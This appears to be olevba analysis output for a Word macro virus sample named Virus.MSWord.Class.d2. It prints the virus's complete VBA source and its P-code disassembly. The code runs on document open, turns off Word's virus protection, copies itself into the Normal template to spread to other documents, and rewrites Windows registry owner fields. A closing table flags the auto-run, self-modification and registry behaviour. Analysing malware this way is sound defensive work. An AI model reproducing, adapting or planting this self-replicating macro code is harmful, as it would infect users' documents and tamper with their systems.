olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
On Error GoTo out
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
Options.VirusProtection = False
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
Options.SaveNormalPrompt = False
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
Options.ConfirmConversions = False
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt > 70 And ad > 0 Then GoTo out
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt < 70 Then
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End If
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
host.codemodule.AddFromFile ("c:\class.sys")
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
With host.codemodule
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    For x = 1 To 16
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .deletelines 1
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    Next x
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End With
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt < 70 Then
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    With host.codemodule
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .replaceline 1, "Sub AutoClose()"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .replaceline 91, "Sub ToolsMacro()"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    For x = 70 To 81
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
        .deletelines 62
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    Next x
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .replaceline 35, "    For x = 1 To 4"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    End With
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End If
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt < 70 Then
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
u = RegCloseKey(k)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End If
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
With host.codemodule
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    For x = 2 To 104 Step 2
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    Next x
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End With
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
out:
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End Sub
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
Sub ViewVBCode()
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.d2
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8965 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #2:
' 	OnError out 
' Line #3:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #11:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #13:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #16:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #17:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #19:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #20:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #22:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #28:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #29:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #30:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #31:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #32:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #33:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #34:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #35:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #37:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #40:
' 	EndWith 
' Line #41:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #42:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #43:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #44:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #45:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #46:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #48:
' 	LitDI2 0x005B 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #50:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0046 
' 	LitDI2 0x0051 
' 	For 
' Line #51:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #52:
' 	LitDI2 0x003E 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #53:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #54:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #56:
' 	LitDI2 0x0023 
' 	LitStr 0x0012 "    For x = 1 To 4"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #57:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #58:
' 	EndWith 
' Line #59:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #62:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #63:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #64:
' 	Ld HKEY_LOCAL_MACHINE 
' 	LitStr 0x0029 "Software\Microsoft\Windows\CurrentVersion"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St u 
' Line #65:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #66:
' 	Ld k 
' 	LitStr 0x000F "RegisteredOwner"
' 	LitDI2 0x0000 
' 	Ld REG_SZ 
' 	LitStr 0x0012 "VicodinES /CB /TNN"
' 	LitDI2 0x0001 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #67:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #68:
' 	Ld k 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	LitDI2 0x0000 
' 	Ld REG_SZ 
' 	LitStr 0x0019 "-(Dr. Diet Mountain Dew)-"
' 	LitDI2 0x0001 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #69:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #70:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St u 
' Line #71:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #74:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #75:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #76:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0068 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #77:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #78:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #79:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #80:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #82:
' 	EndWith 
' Line #83:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #84:
' 	Label out 
' Line #85:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #86:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #87:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #88:
' 	EndSub 
' Line #89:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #90:
' 	FuncDefn (Sub ViewVBCode())
' Line #91:
' 	QuoteRem 0x0000 0x0042 "cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités"
' Line #92:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

